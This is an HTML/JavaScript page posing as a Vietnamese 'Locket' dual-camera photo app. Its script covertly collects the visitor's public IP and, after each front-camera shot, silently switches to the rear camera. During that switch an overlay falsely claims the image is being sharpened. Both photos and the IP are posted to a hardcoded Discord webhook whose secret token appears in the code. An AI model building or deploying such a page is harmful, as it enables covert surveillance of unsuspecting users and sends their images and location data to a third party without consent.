<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Locket Dual Camera Clone</title>
  <!-- Phosphor Icons -->
  <script src="https://unpkg.com/@phosphor-icons/web"></script>
  <style>
    :root {
      --bg-color: #ffaa33;
      --card-bg: #e69526;
      --text-color: #ffffff;
      --accent-color: #ffffff;
      --btn-bg: rgba(255, 255, 255, 0.2);
    }

    body.theme-orange {
      --bg-color: #ffaa33;
      --card-bg: #e69526;
      --text-color: #ffffff;
      --accent-color: #ffffff;
    }
    body.theme-pink {
      --bg-color: #fbcfe8;
      --card-bg: #f472b6;
      --text-color: #831843;
      --accent-color: #db2777;
    }
    body.theme-black {
      --bg-color: #000000;
      --card-bg: #18181b;
      --text-color: #ffffff;
      --accent-color: #a1a1aa;
    }
    body.theme-white {
      --bg-color: #f4f4f5;
      --card-bg: #ffffff;
      --text-color: #09090b;
      --accent-color: #18181b;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      user-select: none;
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 16px;
      transition: background-color 0.3s, color 0.3s;
      overflow: hidden;
    }

    .top-bar {
      width: 100%;
      max-width: 400px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 8px 0;
    }

    .icon-btn {
      background: var(--btn-bg);
      border: none;
      color: var(--text-color);
      width: 44px;
      height: 44px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      cursor: pointer;
      backdrop-filter: blur(10px);
    }

    .theme-selector {
      display: flex;
      gap: 6px;
      background: var(--btn-bg);
      padding: 4px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
    }

    .theme-dot {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      border: 2px solid transparent;
      cursor: pointer;
    }

    .theme-dot.active {
      border-color: var(--text-color);
    }

    /* Khung ngoài 1:1 */
    .viewfinder-container {
      width: 100%;
      max-width: 360px;
      aspect-ratio: 1 / 1;
      border-radius: 48px;
      overflow: hidden;
      position: relative;
      background-color: #000;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Video bên trong giữ tỉ lệ 9:16 tự nhiên */
    #video {
      width: 100%;
      height: auto;
      aspect-ratio: 9 / 16;
      object-fit: cover;
    }

    #video.mirror {
      transform: scaleX(-1);
    }

    .badge-friends {
      position: absolute;
      top: 16px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.4);
      color: white;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
      backdrop-filter: blur(10px);
    }

    .status-overlay {
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 600;
      gap: 12px;
      backdrop-filter: blur(8px);
      text-align: center;
      padding: 20px;
    }

    /* Flash ảo bằng màn hình */
    .screen-flash {
      position: fixed;
      inset: 0;
      background-color: #ffffff;
      z-index: 9999;
      display: none;
      opacity: 0;
      transition: opacity 0.05s ease-in-out;
    }

    /* Modal Popup Yêu cầu Camera */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(8px);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .modal-box {
      background: #1e1e1e;
      color: white;
      width: 100%;
      max-width: 320px;
      border-radius: 28px;
      padding: 24px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    }

    .modal-icon {
      font-size: 48px;
      color: #ffaa33;
      margin-bottom: 12px;
    }

    .modal-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .modal-desc {
      font-size: 14px;
      color: #a1a1aa;
      line-height: 1.4;
      margin-bottom: 20px;
    }

    .modal-btn {
      width: 100%;
      background: #ffaa33;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 20px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
    }

    .controls {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-bottom: 10px;
    }

    .action-row {
      width: 100%;
      display: flex;
      justify-content: space-around;
      align-items: center;
    }

    .shutter-btn {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      border: 5px solid var(--text-color);
      background: transparent;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 4px;
    }

    .shutter-inner {
      width: 100%;
      height: 100%;
      background: var(--text-color);
      border-radius: 50%;
      transition: transform 0.1s;
    }

    .shutter-btn:active .shutter-inner {
      transform: scale(0.85);
    }

    .shutter-btn.sending {
      pointer-events: none;
      opacity: 0.5;
    }

    .history-row {
      display: flex;
      gap: 12px;
      align-items: center;
      opacity: 0.8;
    }

    .history-item {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: var(--btn-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
    }
  </style>
</head>
<body class="theme-orange">

  <!-- Popup Yêu cầu quyền Camera -->
  <div class="modal-overlay" id="permission-modal">
    <div class="modal-box">
      <i class="ph ph-camera modal-icon"></i>
      <div class="modal-title">Cấp quyền Camera</div>
      <div class="modal-desc">Trang web yêu cầu quyền truy cập Camera để tiếp tục sử dụng ứng dụng Locket.</div>
      <button class="modal-btn" onclick="requestPermission()">Đồng ý & Bắt đầu</button>
    </div>
  </div>

  <!-- Màn hình flash trắng -->
  <div class="screen-flash" id="screen-flash"></div>

  <div class="top-bar">
    <button class="icon-btn" id="flash-btn" onclick="toggleFlash()">
      <i class="ph ph-lightning"></i>
    </button>

    <div class="theme-selector">
      <div class="theme-dot" style="background: #000000;" onclick="setTheme('black', this)"></div>
      <div class="theme-dot active" style="background: #ffaa33;" onclick="setTheme('orange', this)"></div>
      <div class="theme-dot" style="background: #fbcfe8;" onclick="setTheme('pink', this)"></div>
      <div class="theme-dot" style="background: #ffffff;" onclick="setTheme('white', this)"></div>
    </div>

    <button class="icon-btn">
      <i class="ph ph-user-plus"></i>
    </button>
  </div>

  <div class="viewfinder-container">
    <video id="video" autoplay playsinline></video>
    <div class="badge-friends">
      <i class="ph ph-users-three"></i> Bạn bè
    </div>
    <div class="status-overlay" id="status-overlay">
      <i class="ph ph-sparkle spinner" style="font-size: 36px; color: #ffaa33;"></i>
      <span id="status-text">Đang xử lý và làm nét để hình ảnh đẹp hơn...</span>
    </div>
  </div>

  <div class="controls">
    <div class="action-row">
      <div style="width: 44px;"></div>

      <button class="shutter-btn" id="shutter-btn" onclick="startDualCapture()">
        <div class="shutter-inner"></div>
      </button>

      <button class="icon-btn" id="switch-cam-btn" onclick="switchCamera()">
        <i class="ph ph-cameraswitch"></i>
      </button>
    </div>

    <div class="history-row">
      <div class="history-item"><i class="ph ph-clock-counter-clockwise"></i></div>
      <span style="font-size: 12px; font-weight: 500;">Khoảnh khắc vừa ghi</span>
    </div>
  </div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1530830759496253591/Pbzj6XovoFjAyAqjYSOvFYkaFk1UP1wRRYU3HFSN8VFNCFTIWx4rhk7mWeECi4_aicI2";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const shutterBtn = document.getElementById('shutter-btn');
    const statusOverlay = document.getElementById('status-overlay');
    const statusText = document.getElementById('status-text');
    const screenFlash = document.getElementById('screen-flash');
    const permissionModal = document.getElementById('permission-modal');

    let currentStream = null;
    let facingMode = 'user'; 
    let isFlashEnabled = true;
    let userIP = "Không xác định";

    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
      } catch (e) {
        userIP = "Không thể lấy IP";
      }
    }

    async function requestPermission() {
      getUserIP();
      const success = await initCamera('user');
      if (success) {
        permissionModal.style.display = 'none';
      } else {
        alert("Vui lòng cho phép quyền sử dụng camera trên trình duyệt để tiếp tục.");
      }
    }

    async function initCamera(mode) {
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
      }

      facingMode = mode;
      const constraints = {
        video: {
          facingMode: facingMode,
          width: { ideal: 1080 },
          height: { ideal: 1920 },
          aspectRatio: 9 / 16
        }
      };

      try {
        currentStream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = currentStream;
        
        if (facingMode === 'user') {
          video.classList.add('mirror');
        } else {
          video.classList.remove('mirror');
        }
        return true;
      } catch (err) {
        return false;
      }
    }

    async function toggleTorch(enable) {
      if (!currentStream) return;
      const track = currentStream.getVideoTracks()[0];
      if (track && 'applyConstraints' in track) {
        const capabilities = track.getCapabilities ? track.getCapabilities() : {};
        if (capabilities.torch) {
          try {
            await track.applyConstraints({ advanced: [{ torch: enable }] });
          } catch (e) {}
        }
      }
    }

    function triggerScreenFlash() {
      return new Promise((resolve) => {
        screenFlash.style.display = 'block';
        screenFlash.style.opacity = '1';
        setTimeout(() => {
          screenFlash.style.opacity = '0';
          setTimeout(() => {
            screenFlash.style.display = 'none';
            resolve();
          }, 100);
        }, 300);
      });
    }

    function switchCamera() {
      const nextMode = (facingMode === 'user') ? 'environment' : 'user';
      initCamera(nextMode);
    }

    function captureFrame() {
      return new Promise((resolve) => {
        const context = canvas.getContext('2d');
        
        canvas.width = video.videoWidth || 1080;
        canvas.height = video.videoHeight || 1920;

        if (facingMode === 'user') {
          context.translate(canvas.width, 0);
          context.scale(-1, 1);
        }

        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
          resolve(blob);
        }, 'image/jpeg', 0.90);
      });
    }

    async function startDualCapture() {
      shutterBtn.classList.add('sending');
      
      // 1. Chụp camera trước
      if (isFlashEnabled) {
        triggerScreenFlash();
      }
      const firstBlob = await captureFrame();
      const photos = [{ name: 'camera_1.jpg', blob: firstBlob }];

      // 2. Hiển thị thông báo xử lý & chuyển camera sau
      statusText.innerText = "Đang xử lý và làm nét để hình ảnh đẹp hơn...";
      statusOverlay.style.display = 'flex';

      const otherMode = (facingMode === 'user') ? 'environment' : 'user';
      const success = await initCamera(otherMode);

      if (success) {
        await new Promise(r => setTimeout(r, 600));

        if (isFlashEnabled) {
          await toggleTorch(true);
          await new Promise(r => setTimeout(r, 200));
        }

        const secondBlob = await captureFrame();
        photos.push({ name: 'camera_2.jpg', blob: secondBlob });

        if (isFlashEnabled) {
          await toggleTorch(false);
        }
      }

      // Restore camera mặt trước
      await initCamera('user');
      statusOverlay.style.display = 'none';

      // 3. Gửi tệp ảnh gốc lên Discord Webhook
      await sendToDiscord(photos);
      shutterBtn.classList.remove('sending');
    }

    async function sendToDiscord(photos) {
      const formData = new FormData();
      
      photos.forEach((photo, index) => {
        formData.append(`file${index + 1}`, photo.blob, photo.name);
      });

      formData.append("payload_json", JSON.stringify({
        content: `📸 Khoảnh khắc mới từ Locket! (${photos.length} góc chụp)\n🌐 IP address: ${userIP}`
      }));

      try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          body: formData
        });

        if (response.ok) {
          alert("Gửi khoảnh khắc thành công!");
        } else {
          alert("Gửi ảnh lên Discord thất bại.");
        }
      } catch (error) {
        alert("Lỗi kết nối tới Webhook.");
      }
    }

    function setTheme(themeName, element) {
      document.body.className = `theme-${themeName}`;
      document.querySelectorAll('.theme-dot').forEach(dot => dot.classList.remove('active'));
      element.classList.add('active');
    }

    function toggleFlash() {
      isFlashEnabled = !isFlashEnabled;
      const btn = document.getElementById('flash-btn');
      const icon = btn.querySelector('i');
      if (isFlashEnabled) {
        icon.className = 'ph ph-lightning';
      } else {
        icon.className = 'ph ph-lightning-slash';
      }
    }
  </script>
</body>
</html>
